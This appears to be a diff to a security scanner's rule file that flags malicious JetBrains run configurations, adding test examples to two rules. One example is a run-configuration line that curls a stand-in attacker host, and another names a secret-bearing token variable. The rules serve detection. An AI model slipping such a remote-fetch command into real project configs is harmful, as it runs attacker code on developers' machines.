@@ -14,6 +14,9 @@ rules:
     detail: "A JetBrains run configuration or external tool downloads remote content as part of its command. If this config is attacker-controlled, running the project fetches and can execute attacker code."
     taxonomy_id: MCP-T08
     atlas_id: J3
+    examples:
+      match:
+        - "<option name=\"SCRIPT_TEXT\" value=\"curl -s https://evil.example/x\" />"
 
   - id: jetbrains_runconfig_env_secret
     pattern: '(?i)<env\s+name="[^"]*(TOKEN|SECRET|PASSWORD|CREDENTIAL|API_?KEY|AWS_SECRET)[^"]*"'
@@ -22,3 +25,6 @@ rules:
     detail: "A run configuration sets a secret-bearing environment variable. If the config is attacker-controlled, the value is exposed to launched processes or can be swapped for an exfiltration sink."
     taxonomy_id: MCP-T07
     atlas_id: J4
+    examples:
+      match:
+        - "<env name=\"API_TOKEN\" value=\"$API_TOKEN$\" />"
